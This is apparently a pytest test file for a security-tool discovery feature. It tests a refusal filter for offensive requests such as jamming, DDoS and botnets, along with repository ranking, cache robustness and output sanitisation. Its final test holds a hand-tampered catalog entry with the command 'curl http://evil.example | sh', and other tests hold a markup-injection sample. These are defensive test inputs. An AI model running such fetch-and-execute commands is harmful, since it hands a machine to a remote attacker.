import re
import urllib.error
from datetime import datetime, timezone
from pathlib import Path

import pytest
import yaml

from hackingtool import discover
from hackingtool.catalog_owners import CATALOG_OWNERS
from hackingtool.tags import TAXONOMY

NOW = datetime(2026, 7, 26, tzinfo=timezone.utc)

_ITEM = {
    "full_name": "ffuf/ffuf", "description": "Fast web fuzzer written in Go",
    "html_url": "https://github.com/ffuf/ffuf", "stargazers_count": 16000,
    "forks_count": 1200, "pushed_at": "2026-06-01T00:00:00Z",
    "created_at": "2018-01-01T00:00:00Z", "archived": False, "disabled": False,
    "fork": False, "license": {"spdx_id": "MIT"}, "language": "Go",
    "topics": ["fuzzing", "web"], "owner": {"login": "ffuf", "type": "User"},
}


def _repo(**kw):
    base = dict(full_name="acme/tool", description="A real security tool for testing",
                url="https://github.com/acme/tool", stars=1000, forks=100,
                pushed_at="2026-06-01T00:00:00Z", created_at="2022-01-01T00:00:00Z",
                archived=False, fork=False, license="MIT", language="Go",
                topics=["security"], owner="acme", owner_type="User")
    base.update(kw)
    return discover.Repo(**base)


def test_refuse_jamming_offers_auditing_alternative():
    msg = discover._refuse("wifi jamming tool")
    assert msg
    assert "auditing" in msg.lower()
    assert "aircrack-ng" in msg


def test_refuse_ddos_is_plain_refusal_no_alternative():
    msg = discover._refuse("tool to take down a website")
    assert msg
    assert "aircrack" not in msg.lower()


def test_allowed_need_returns_empty_string():
    assert discover._refuse("find subdomains") == ""
    assert discover._refuse("wifi security auditing") == ""


def test_refuse_is_case_insensitive():
    assert discover._refuse("DDoS Booter") != ""


def test_defensive_malware_analysis_needs_are_allowed():
    assert discover._refuse("tool to detect botnet C2 traffic in a pcap") == ""
    assert discover._refuse("ransomware analysis sandbox") == ""
    assert discover._refuse("ransomware decryptor for IR case") == ""


def test_offensive_botnet_ransomware_construction_is_refused():
    assert discover._refuse("build a botnet") != ""
    assert discover._refuse("deploy ransomware to a network") != ""


@pytest.mark.parametrize("need", [
    "detect a SYN flood in a pcap",
    "ddos detection and mitigation",
    "detect dos attack traffic",
    "analyse a UDP flood capture",
    "audit our Jamf MDM configuration",
    "jamstack site security scanner",
    "detect wifi deauth / jamming attacks",
    "how do I avoid logging sensitive data in my app",
    "bypass antivirus false positives in my build",
])
def test_blue_team_and_dfir_phrasing_is_never_refused(need):
    """Bare substrings like "flood"/"jam" used to false-refuse defensive
    phrasing; a defensive-intent guard (detect/analy/forensic/mitigat/...)
    must let genuinely blue-team needs through."""
    assert discover._refuse(need) == ""


@pytest.mark.parametrize("need", [
    "wifi jamming",
    "ddos a site",
    "take down their server",
    "build a botnet",
    "evade detection on the host",
    "bypass antivirus to drop my payload",
])
def test_genuinely_offensive_needs_still_refused(need):
    """The defensive-intent guard must not become a refusal bypass — needs
    that are unambiguously offensive still refuse even though some contain
    "detect"/"detection" (e.g. "evade detection")."""
    assert discover._refuse(need) != ""


@pytest.mark.parametrize("need", [
    "build a botnet false positive",
    "deploy ransomware, false positives",
    "wifi jamming false positive",
])
def test_false_positive_carve_out_is_scoped_to_evasion(need):
    """Regression: the "false positive" carve-out (which exists so an analyst
    triaging AV/EDR noise isn't accused of evasion) was an unconditional early
    return, so appending two words defeated EVERY refusal category. It must
    only soften the evasion check."""
    assert discover._refuse(need) != ""


def test_analyst_false_positive_phrasing_is_still_allowed():
    """The carve-out must keep doing its actual job."""
    assert discover._refuse("bypass antivirus false positives in my build") == ""


@pytest.mark.parametrize("need", [
    "bluetooth jammer", "gsm jammer", "signal jammer", "jammer",
    "syn flood tool", "http flood script", "udp flood generator",
])
def test_offensive_jammer_and_flood_phrasing_is_refused(need):
    """Regression: dropping the bare "flood"/"jam" keys to stop false-refusing
    blue-team needs over-shot and lost these. "jammer" is safe where "jam" was
    not (neither "jamf" nor "jamstack" contains it), and "flood" is safe now
    that the defensive guard runs before this table."""
    assert discover._refuse(need) != ""


def test_generated_owners_file_is_current():
    """The committed file must match a fresh generation — it cannot rot."""
    import sys
    sys.path.insert(0, "scripts")
    import gen_catalog_owners as gen
    from pathlib import Path
    assert gen.render(gen.collect()) == Path(gen.OUT).read_text()


def test_known_good_owners_are_present():
    assert "projectdiscovery" in CATALOG_OWNERS
    assert "swisskyrepo" in CATALOG_OWNERS


def test_non_owner_path_segments_are_excluded():
    """Regression: 'org'/'repos'/'search' are URL path segments, not owners —
    placeholder docs and api.github.com paths must not grant the trust bonus."""
    assert "org" not in CATALOG_OWNERS
    assert "repos" not in CATALOG_OWNERS
    assert "search" not in CATALOG_OWNERS
    assert "projectdiscovery" in CATALOG_OWNERS
    assert "swisskyrepo" in CATALOG_OWNERS


def test_docs_repo_matches_on_name_only():
    assert discover._is_docs_repo(_repo(full_name="x/awesome-hacking"))
    assert discover._is_docs_repo(_repo(full_name="x/web-security-cheatsheet"))
    assert discover._is_docs_repo(_repo(full_name="x/pentest-roadmap"))


def test_docs_repo_does_not_match_real_tools():
    """Regression: the name+description regex killed all of these (measured)."""
    assert not discover._is_docs_repo(
        _repo(full_name="aboul3la/Sublist3r", description="Fast subdomain enumeration"))
    assert not discover._is_docs_repo(
        _repo(full_name="kubescape/kubescape",
              description="Kubernetes resources security scanner"))
    assert not discover._is_docs_repo(
        _repo(full_name="sc0tfree/mentalist", description="Wordlist generator GUI"))
    assert not discover._is_docs_repo(
        _repo(full_name="mandiant/flare-vm",
              description="A collection of software installations"))


def test_trusted_owner_scores_higher():
    trusted = _repo(owner="projectdiscovery")
    plain = _repo(owner="rando123")
    assert discover._score(trusted, NOW) > discover._score(plain, NOW)


def test_stale_repo_is_demoted_not_excluded():
    """Staleness costs one point — THC-Hydra is quiet and canonical."""
    fresh = _repo(pushed_at="2026-06-01T00:00:00Z")
    stale = _repo(pushed_at="2021-01-01T00:00:00Z")
    assert discover._score(fresh, NOW) > discover._score(stale, NOW)
    assert discover._score(stale, NOW) > 0        # still ranked, not deleted


def test_archived_and_disabled_are_excluded_entirely():
    assert discover._rank([_repo(archived=True)], NOW) == []


def test_log_flattening_keeps_a_canonical_tool_above_a_bigger_awesome_list():
    """SecLists-style: 4x the stars but a docs-repo name must not win."""
    tool = _repo(full_name="ffuf/ffuf", stars=16000, owner="ffuf")
    listy = _repo(full_name="x/awesome-security-list", stars=72000, language="Markdown")
    ranked = discover._rank([listy, tool], NOW)
    assert ranked[0].full_name == "ffuf/ffuf"


def test_score_records_why():
    r = _repo(owner="projectdiscovery")
    discover._score(r, NOW)
    assert r.why and any("trusted" in w.lower() for w in r.why)


def _fuzzing_rewrite():
    return discover.Rewrite(tags=["fuzzing", "web"], topic="fuzzing", jargon="web fuzzer")


def test_relevant_repo_outranks_bigger_but_unrelated_repo():
    """Regression: topic:fuzzing surfaces binary-fuzzing/unrelated repos with
    more stars than a web-fuzzing match. The relevance term, not stars or the
    trusted-owner bonus, must be what wins this: the matcher has FEWER stars
    than the repo it beats, and neither owner is in CATALOG_OWNERS (so this
    can't pass by accident on an unrelated bonus).

    Proven to depend on the relevance term: with rewrite=None (term absent)
    the bigger/unrelated repo wins 10.68 > 9.75 (see
    test_relevance_term_is_load_bearing_for_the_regression below); only the
    term flips the ranking here.
    """
    rw = _fuzzing_rewrite()
    matcher = _repo(full_name="some-dev/web-fuzz", stars=4000, forks=200,
                     description="Fast web fuzzer for directory and content discovery",
                     topics=["fuzzing", "web"], owner="some-dev")
    bigger_unrelated = _repo(full_name="spacejam/sled", stars=16000, forks=900,
                              description="the champagne of beta embedded databases",
                              topics=["database", "embedded-database", "rust"],
                              owner="spacejam")
    assert matcher.owner not in CATALOG_OWNERS
    assert bigger_unrelated.owner not in CATALOG_OWNERS
    ranked = discover._rank([bigger_unrelated, matcher], NOW, rewrite=rw)
    assert ranked[0].full_name == "some-dev/web-fuzz"


def test_relevance_term_is_load_bearing_for_the_regression():
    """Neutralise/restore evidence: same fixture as the test above, scored
    once with the relevance term absent (rewrite=None) and once present.
    Without it the bigger/unrelated repo wins; the term is what flips it."""
    rw = _fuzzing_rewrite()
    matcher = _repo(full_name="some-dev/web-fuzz", stars=4000, forks=200,
                     description="Fast web fuzzer for directory and content discovery",
                     topics=["fuzzing", "web"], owner="some-dev")
    bigger_unrelated = _repo(full_name="spacejam/sled", stars=16000, forks=900,
                              description="the champagne of beta embedded databases",
                              topics=["database", "embedded-database", "rust"],
                              owner="spacejam")
    neutralised = discover._rank([bigger_unrelated, matcher], NOW, rewrite=None)
    assert neutralised[0].full_name == "spacejam/sled"  # term absent -> stars win
    restored = discover._rank([bigger_unrelated, matcher], NOW, rewrite=rw)
    assert restored[0].full_name == "some-dev/web-fuzz"  # term present -> relevance wins


def test_description_stuffed_repo_does_not_outrank_topic_matching_tool():
    """Rank-farming guard: generic need words crammed into free-text
    description (no matching topics, high stars) must not beat a genuine
    tool whose curated `topics` actually match — topics get full credit,
    description-only matches get half credit."""
    rw = _fuzzing_rewrite()
    genuine = _repo(full_name="some-dev/web-fuzz", stars=6000, forks=400,
                     description="Fast web fuzzer for directory and content discovery",
                     topics=["fuzzing", "web"], owner="some-dev")
    stuffed = _repo(full_name="stuffer/repo", stars=18000, forks=1800,
                     description=("web fuzzing fuzzer tool for web fuzzing fuzzer "
                                  "enthusiasts and friends"),
                     topics=["unrelated-topic"], owner="stuffer")
    ranked = discover._rank([stuffed, genuine], NOW, rewrite=rw)
    assert ranked[0].full_name == "some-dev/web-fuzz"


def test_relevance_bonus_ceiling_is_combined_not_per_bucket():
    """Boundary: a need with 4+ distinct terms, matched across BOTH topics
    (3 terms) and description (1 more, different term), must not exceed the
    spec'd 4.5 ceiling (1.5 * 3 matched terms). Two independent per-bucket
    caps would let this reach 6.75 (1.5*3 + 0.75*3) instead."""
    rw = discover.Rewrite(tags=["api", "web", "fuzzing"], topic="api-security",
                           jargon="api fuzzing")
    assert len(discover._need_terms(rw)) >= 4  # api, web, fuzzing, security

    def fixture():
        return _repo(full_name="acme/api-fuzz", stars=5000, forks=300,
                     description="api fuzzing security tool for web apis",
                     topics=["api", "web", "security"], owner="acme")

    with_relevance = discover._score(fixture(), NOW, rewrite=rw)
    without_relevance = discover._score(fixture(), NOW)
    assert with_relevance - without_relevance <= 4.5 + 1e-9


def test_zero_overlap_repo_is_demoted_not_excluded():
    rw = _fuzzing_rewrite()
    sled = _repo(full_name="spacejam/sled", stars=9054,
                 description="the champagne of beta embedded databases",
                 topics=["database", "embedded-database", "rust"])
    ranked = discover._rank([sled], NOW, rewrite=rw)
    assert len(ranked) == 1  # demoted, never dropped from the pool
    assert ranked[0].full_name == "spacejam/sled"


def test_score_and_rank_without_rewrite_is_unchanged():
    """Back-compat: no rewrite argument -> no relevance term at all."""
    r = _repo()
    score_no_rewrite = discover._score(r, NOW)
    why_no_rewrite = list(r.why)
    score_explicit_none = discover._score(_repo(), NOW, rewrite=None)
    assert score_no_rewrite == score_explicit_none
    assert not any("overlap" in w.lower() or "matches:" in w.lower() for w in why_no_rewrite)
    assert discover._rank([_repo()], NOW) == discover._rank([_repo()], NOW)


def test_why_records_matched_relevance_terms():
    rw = _fuzzing_rewrite()
    ffuf = _repo(full_name="ffuf/ffuf", stars=16446, forks=1200,
                 description="Fast web fuzzer written in Go",
                 topics=["fuzzing", "web"], owner="ffuf")
    discover._score(ffuf, NOW, rewrite=rw)
    assert any("matches:" in w.lower() for w in ffuf.why)


def test_rewrite_hidden_directories_is_web_fuzzing_not_active_directory():
    """Regression: bare keyword_match returns 'active-directory' for this web need."""
    rw = discover._rewrite("find hidden directories on a website")
    assert rw.source == "intents"
    assert "active-directory" not in rw.tags
    assert "fuzz" in rw.jargon.lower() or "directory" in rw.jargon.lower()
    assert rw.topic


def test_rewrite_wifi_resolves_to_wireless():
    """Regression: bare keyword_match returns [] for this."""
    rw = discover._rewrite("wifi security auditing")
    assert "wireless" in rw.tags
    assert rw.topic


def test_rewrite_kubernetes_resolves():
    """Regression: bare keyword_match returns [] for this."""
    rw = discover._rewrite("kubernetes security scanning")
    assert rw.tags and rw.topic
    assert rw.source == "intents"


def test_rewrite_falls_back_to_keyword_match():
    # Must genuinely miss every _INTENTS regex (unlike "crack password hashes",
    # which resolves via the hash-crack row and passes even with the keyword
    # branch deleted) so this test actually exercises discover.py:418-422.
    rw = discover._rewrite("poisoning")
    assert rw.tags
    assert rw.source == "keyword"


def test_rewrite_raw_fallback_for_unknown_need():
    rw = discover._rewrite("quantum flux capacitor alignment")
    assert rw.source == "raw"
    assert len(rw.jargon.split()) <= 3


def test_every_intent_tag_is_in_the_taxonomy():
    for _rx, tags, _topic, _jargon in discover._INTENTS:
        unknown = [t for t in tags if t not in TAXONOMY]
        assert not unknown, f"tags not in TAXONOMY: {unknown}"


def test_every_jargon_is_at_most_three_terms():
    """4+ terms empties GitHub's result set (measured)."""
    for _rx, _tags, _topic, jargon in discover._INTENTS:
        assert 1 <= len(jargon.split()) <= 3, f"bad jargon: {jargon!r}"


def test_every_intent_regex_compiles_and_has_a_topic():
    for rx, _tags, topic, _jargon in discover._INTENTS:
        assert isinstance(rx, re.Pattern)
        assert topic and " " not in topic


def test_rewrite_is_deterministic():
    a = discover._rewrite("subdomain enumeration")
    b = discover._rewrite("subdomain enumeration")
    assert (a.tags, a.topic, a.jargon, a.source) == (b.tags, b.topic, b.jargon, b.source)


@pytest.fixture(autouse=True)
def _isolated_find_cache(tmp_path, monkeypatch):
    """Never read/write the developer's real cache dir; keeps tests deterministic
    across runs (repeated needs would otherwise hit a stale on-disk cache)."""
    monkeypatch.setattr(discover, "_cache_path",
                         lambda query: tmp_path / f"{discover._cache_key(query)}.json")


def test_find_on_refused_need_never_touches_the_network(monkeypatch):
    """The charter filter gates the network, not just the display."""
    called = []
    monkeypatch.setattr(discover, "_fetch", lambda url: called.append(url))
    res = discover.find("wifi jamming")
    assert res.refused
    assert called == [], "search must not run for a refused need"


def test_find_returns_ranked_repos(monkeypatch):
    monkeypatch.setattr(discover, "_fetch",
                         lambda url: {"total_count": 1, "items": [_ITEM]})
    res = discover.find("find hidden directories on a website")
    assert res.refused == ""
    assert res.repos and res.repos[0].full_name == "ffuf/ffuf"
    assert res.repos[0].clone_cmd == "git clone https://github.com/ffuf/ffuf"


def test_find_dedupes_across_both_arms(monkeypatch):
    monkeypatch.setattr(discover, "_fetch",
                         lambda url: {"total_count": 1, "items": [_ITEM]})
    res = discover.find("web fuzzing")
    assert len([r for r in res.repos if r.full_name == "ffuf/ffuf"]) == 1


def test_search_returns_empty_on_network_error(monkeypatch):
    def boom(url):
        raise urllib.error.URLError("offline")
    monkeypatch.setattr(discover, "_fetch", boom)
    res = discover.find("subdomain enumeration")
    assert res.repos == []
    assert "unreachable" in res.note.lower()


def test_search_returns_empty_on_bad_json(monkeypatch):
    def boom(url):
        raise ValueError("bad json")
    monkeypatch.setattr(discover, "_fetch", boom)
    assert discover.find("subdomain enumeration").repos == []


@pytest.mark.parametrize("bad_payload", [
    {"total_count": 3},          # cache file is a JSON object, not a list
    ["ffuf/ffuf"],                # cache file is a list of plain strings
])
def test_find_survives_a_foreign_shaped_cache_file(tmp_path, monkeypatch, bad_payload):
    """A tampered or foreign-format cache file must degrade to no results,
    not raise AttributeError out of find()."""
    import json
    cache_file = tmp_path / "cache.json"
    cache_file.write_text(json.dumps(bad_payload))
    monkeypatch.setattr(discover, "_cache_path", lambda query: cache_file)
    monkeypatch.setattr(discover, "_fetch", lambda url: pytest.fail("cache hit, no network"))
    res = discover.find("subdomain enumeration")
    assert res.repos == []


def test_find_survives_a_non_dict_search_response(monkeypatch):
    """A GitHub search response that isn't a JSON object (e.g. a bare array)
    must not raise AttributeError out of find()."""
    monkeypatch.setattr(discover, "_fetch", lambda url: ["ffuf/ffuf"])
    res = discover.find("subdomain enumeration")
    assert res.repos == []


def test_rate_limit_note_mentions_the_token(monkeypatch):
    def limited(url):
        raise discover.RateLimited("resets in 47s")
    monkeypatch.setattr(discover, "_fetch", limited)
    res = discover.find("subdomain enumeration")
    assert res.repos == []
    assert "token" in res.note.lower()


def test_empty_need_is_handled(monkeypatch):
    monkeypatch.setattr(discover, "_fetch", lambda url: {"items": []})
    assert discover.find("").repos == []


def test_token_never_appears_in_a_cache_key(monkeypatch):
    monkeypatch.setenv("HACKINGTOOL_GITHUB_TOKEN", "ghp_supersecret")
    key = discover._cache_key("topic:fuzzing web fuzzer")
    assert "ghp_supersecret" not in key
    assert "supersecret" not in key


def test_run_prints_refusal_and_alternative(capsys, monkeypatch):
    monkeypatch.setattr(discover, "_fetch", lambda url: pytest.fail("no network"))
    discover.run("wifi jamming")
    out = capsys.readouterr().out.lower()
    assert "out of scope" in out
    assert "aircrack-ng" in out


def test_run_shows_clone_line_but_never_executes(capsys, monkeypatch):
    monkeypatch.setattr(discover, "_fetch",
                         lambda url: {"total_count": 1, "items": [_ITEM]})
    discover.run("find hidden directories on a website")
    out = capsys.readouterr().out
    assert "git clone" in out


def test_run_survives_offline(capsys, monkeypatch):
    def boom(url):
        raise urllib.error.URLError("offline")
    monkeypatch.setattr(discover, "_fetch", boom)
    discover.run("subdomain enumeration")          # must not raise
    assert "unreachable" in capsys.readouterr().out.lower()


def test_run_escapes_repo_markup_in_description_and_topics(capsys, monkeypatch):
    """Repo-derived text (full_name, license, description, why) must render
    literally, never be parsed as Rich markup — a maintainer-controlled field
    is an injection surface for a markup-enabled console.print. Every field
    carrying markup here is one this test would catch if its escape() were
    dropped (see fix-round-1 report for the delete-and-confirm-fail run)."""
    evil_item = dict(_ITEM, full_name="[link=http://evil]ffuf[/link]/ffuf",
                      description="[bold red]owned[/]",
                      license={"spdx_id": "[bold]MIT[/bold]"},
                      topics=["fuzzing", "web", "owned"])
    monkeypatch.setattr(discover, "_fetch",
                         lambda url: {"total_count": 1, "items": [evil_item]})
    discover.run("find hidden directories on a website")
    out = capsys.readouterr().out
    assert "[link=http://evil]ffuf[/link]/ffuf" in out
    assert "[bold red]owned[/]" in out
    assert "[bold]MIT[/bold]" in out
    assert "\x1b[1m\x1b[31mowned\x1b[0m" not in out  # not actually styled


def test_run_empty_need_shows_usage_once(capsys, monkeypatch):
    monkeypatch.setattr(discover, "_fetch", lambda url: pytest.fail("no network"))
    discover.run("")
    out = capsys.readouterr().out
    assert out.count("Usage: /find") == 1
    assert "Tip:" not in out  # token tip must not print on the no-op path


def test_run_refusal_has_no_token_tip(capsys, monkeypatch):
    monkeypatch.setattr(discover, "_fetch", lambda url: pytest.fail("no network"))
    discover.run("wifi jamming")
    assert "Tip:" not in capsys.readouterr().out


# --- save_repo: found.yaml persistence (structurally inert entries) --------

def test_saved_entry_has_no_executable_fields(tmp_path, monkeypatch):
    monkeypatch.setattr(discover, "_found_path", lambda: tmp_path / "found.yaml")
    r = discover.Repo(full_name="ffuf/ffuf", description="Fast web fuzzer",
                      url="https://github.com/ffuf/ffuf", stars=16000, forks=1200,
                      pushed_at="2026-06-01T00:00:00Z", created_at="2018-01-01T00:00:00Z",
                      archived=False, fork=False, license="MIT", language="Go",
                      topics=["fuzzing"], owner="ffuf", owner_type="User")
    path = discover.save_repo(r, ["fuzzing", "web"])
    data = yaml.safe_load(path.read_text())
    entry = data["tools"][0]
    assert "install" not in entry, "discovered entries must never be installable"
    assert "run" not in entry
    assert entry["discovered"] is True
    assert entry["project_url"] == "https://github.com/ffuf/ffuf"


def test_saved_description_is_sanitized(tmp_path, monkeypatch):
    monkeypatch.setattr(discover, "_found_path", lambda: tmp_path / "found.yaml")
    r = discover.Repo(full_name="x/y", description="bad\x1b[31m ctrl\x00chars",
                      url="https://github.com/x/y", stars=1, forks=0,
                      pushed_at="", created_at="", archived=False, fork=False,
                      license="", language="", topics=[], owner="x", owner_type="User")
    entry = yaml.safe_load(discover.save_repo(r, ["web"]).read_text())["tools"][0]
    assert "\x1b" not in entry["description"] and "\x00" not in entry["description"]


def test_saving_twice_does_not_duplicate(tmp_path, monkeypatch):
    monkeypatch.setattr(discover, "_found_path", lambda: tmp_path / "found.yaml")
    r = discover.Repo(full_name="x/y", description="d", url="https://github.com/x/y",
                      stars=1, forks=0, pushed_at="", created_at="", archived=False,
                      fork=False, license="", language="", topics=[], owner="x",
                      owner_type="User")
    discover.save_repo(r, ["web"])
    path = discover.save_repo(r, ["web"])
    assert len(yaml.safe_load(path.read_text())["tools"]) == 1


_SAVE_REPO = dict(
    full_name="x/y", description="d", url="https://github.com/x/y",
    stars=1, forks=0, pushed_at="", created_at="", archived=False,
    fork=False, license="", language="", topics=[], owner="x", owner_type="User",
)


def test_save_repo_never_raises_on_unwritable_dir(tmp_path, monkeypatch):
    """A read-only ~/.hackingtool must not crash the REPL on 'a'."""
    monkeypatch.setattr(discover, "_found_path", lambda: tmp_path / "ro" / "found.yaml")
    monkeypatch.setattr(Path, "mkdir",
                         lambda *a, **kw: (_ for _ in ()).throw(PermissionError("denied")))
    r = discover.Repo(**_SAVE_REPO)
    assert discover.save_repo(r, ["web"]) is None


def test_save_repo_recovers_from_non_dict_top_level(tmp_path, monkeypatch):
    """found.yaml whose top level is a list must not raise AttributeError."""
    path = tmp_path / "found.yaml"
    path.write_text(yaml.safe_dump(["not", "a", "dict"]))
    monkeypatch.setattr(discover, "_found_path", lambda: path)
    r = discover.Repo(**_SAVE_REPO)
    saved = discover.save_repo(r, ["web"])
    assert saved is not None
    assert yaml.safe_load(saved.read_text())["tools"][0]["project_url"] == r.url


def test_save_repo_recovers_from_non_list_tools(tmp_path, monkeypatch):
    """A found.yaml with `tools: not-a-list` must not raise AttributeError."""
    path = tmp_path / "found.yaml"
    path.write_text(yaml.safe_dump({"category": {"title": "x"}, "tools": "not-a-list"}))
    monkeypatch.setattr(discover, "_found_path", lambda: path)
    r = discover.Repo(**_SAVE_REPO)
    saved = discover.save_repo(r, ["web"])
    assert saved is not None
    assert yaml.safe_load(saved.read_text())["tools"][0]["project_url"] == r.url


def test_run_reports_save_failure_instead_of_claiming_success(capsys, monkeypatch, tmp_path):
    monkeypatch.setattr(discover, "_fetch",
                         lambda url: {"total_count": 1, "items": [_ITEM]})
    monkeypatch.setattr(discover, "save_repo", lambda repo, tags: None)
    monkeypatch.setattr("sys.stdin.isatty", lambda: True)
    from hackingtool import prompt
    answers = iter(["a", "1"])
    monkeypatch.setattr(prompt, "simple", lambda *_a, **_kw: next(answers))
    discover.run("find hidden directories on a website")
    out = capsys.readouterr().out
    assert "Added." not in out
    assert "Could not save" in out


def test_malformed_user_catalog_does_not_break_the_shipped_catalog(tmp_path):
    from hackingtool import registry
    (tmp_path / "found.yaml").write_text("{ this is not: valid: yaml: [[[")
    reg = registry.load(user_dir=tmp_path)
    assert reg.categories, "shipped catalog must still load"


def test_tampered_user_catalog_entry_is_still_inert(tmp_path):
    """save_repo() writes no install/run keys — but the loader must not trust
    that the file on disk is still what we wrote. Anyone who can edit
    found.yaml must not thereby gain a runnable command."""
    from hackingtool import registry
    (tmp_path / "found.yaml").write_text(yaml.safe_dump({
        "category": {"title": "Found", "merge_into": "Others"},
        "tools": [{
            "title": "evil (discovered)",
            "kind": "resource",
            "url": "https://evil.example/payload",
            "description": "hand-edited to be executable",
            "project_url": "https://github.com/x/y",
            "discovered": True,
            "install": {"commands": ["curl http://evil.example | sh"]},
            "run": ["curl http://evil.example | sh"],
            "system_pkgs": {"apt": ["nmap"]},
        }],
    }))
    tools = [t for c in registry.load(user_dir=tmp_path).categories
             for t in c.tools if t.TITLE == "evil (discovered)"]
    assert tools, "the entry should still load, just inert"
    tool = tools[0]
    assert tool.INSTALL_COMMANDS == []
    assert tool.RUN_COMMANDS == []
    assert not tool.SYSTEM_PKGS
    offered = {name for name, _fn in tool.OPTIONS}
    assert not offered & {"Install", "Run", "Update", "Open link"}, \
        f"tampered entry must offer no executable action, got {offered}"
